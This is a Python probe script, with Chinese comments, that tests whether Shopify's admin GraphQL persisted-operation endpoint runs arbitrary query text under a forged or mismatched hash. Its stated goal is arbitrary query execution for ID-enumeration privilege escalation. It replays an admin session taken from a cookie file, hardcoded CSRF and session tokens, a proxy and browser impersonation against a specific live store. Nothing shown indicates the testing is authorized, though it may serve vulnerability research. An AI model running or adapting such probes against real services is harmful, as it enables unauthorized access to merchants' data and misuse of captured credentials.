# -*- coding: utf-8 -*-
"""验证 admin GraphQL 是否接受任意查询文本(非注册表限制)
如果 body 带 query 文本 + 任意 hash 都执行 -> 任意 GraphQL 执行,可构造 ID 枚举越权
"""
import hashlib, json
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": "https://admin.shopify.com/store/jqpkdm-kb/draft_orders/1102015168554",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

def probe(label, url, body):
    try:
        r = requests.post(url, json=body, headers=HEADERS, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[{label}] HTTP {r.status_code}")
        print(f"  {r.text[:500]}")
        return r
    except Exception as e:
        print(f"[{label}] ERROR {e}")
        return None

if __name__ == "__main__":
    # 1. 已知 hash 的查询文本(简单只读查询),用自己的 hash 试
    q1 = "query shopInfo { shop { name myshopifyDomain } }"
    h1 = hashlib.sha256(q1.encode()).hexdigest()
    url1 = f"https://admin.shopify.com/api/operations/{h1}/shopInfo/shopify/jqpkdm-kb"
    probe("ARBITRARY-HASH+QUERY", url1, {"query": q1, "variables": {}, "operationName": "shopInfo"})

    # 2. 已知注册表 hash(DraftOrderComplete) + 自定义 query 文本
    url2 = "https://admin.shopify.com/api/operations/12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d/DraftOrderComplete/shopify/jqpkdm-kb"
    probe("KNOWN-HASH+CUSTOM-QUERY", url2, {"query": q1, "variables": {}, "operationName": "shopInfo"})

    # 3. 只带 variables 不带 query(标准 persisted 请求,基线)
    body3 = {
        "operationName": "DraftOrderComplete",
        "variables": {"id": "gid://shopify/DraftOrder/1102015168554", "paymentPending": True,
                      "paymentGatewayId": None, "sourceName": "shopify_draft_orders", "bypassCartValidations": False},
        "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
            "client_route_handle": "draftOrders:show", "client_pathname": "/store/jqpkdm-kb/draft_orders/1102015168554",
            "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
            "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
            "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
    }
    probe("BASELINE-NO-QUERY", url2, body3)
